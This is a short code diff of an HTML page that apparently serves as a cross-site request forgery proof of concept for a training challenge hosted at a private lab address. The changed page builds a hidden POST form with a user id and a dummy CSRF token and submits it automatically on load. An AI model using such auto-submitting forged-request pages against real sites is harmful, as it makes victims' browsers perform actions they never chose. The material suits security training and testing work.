@@ -2,20 +2,22 @@
 <html>
 <body>
 
-<script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
+<!-- <script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script> -->
 
-  <form id="myForm" action="https://192.168.9.113/user/csrfchallengethree/plusplus" method="post">
+  <form id="myForm" action="https://192.168.9.113/user/csrfchallengethree/plusplus" method="POST">
     <div>
       <input name="userid" value="46e6cc2c6bd3435da76c4978037b2d9cea2e2185">
-      <input name="csrfTocken" value=Cookies.get('token');>
+      <input name="csrfToken" id="csrfToken" value="any">
       <input type="submit" value="Submit">
     </div>
   </form>
   
 
-  <!-- <script>
+  <script>
+    // document.getElementById("csrfToken").value=Cookies.get("token");
+    // x = Cookies.get('token');
     document.getElementById("myForm").submit();
-  </script> -->
+  </script>
 
 </body>
 </html>
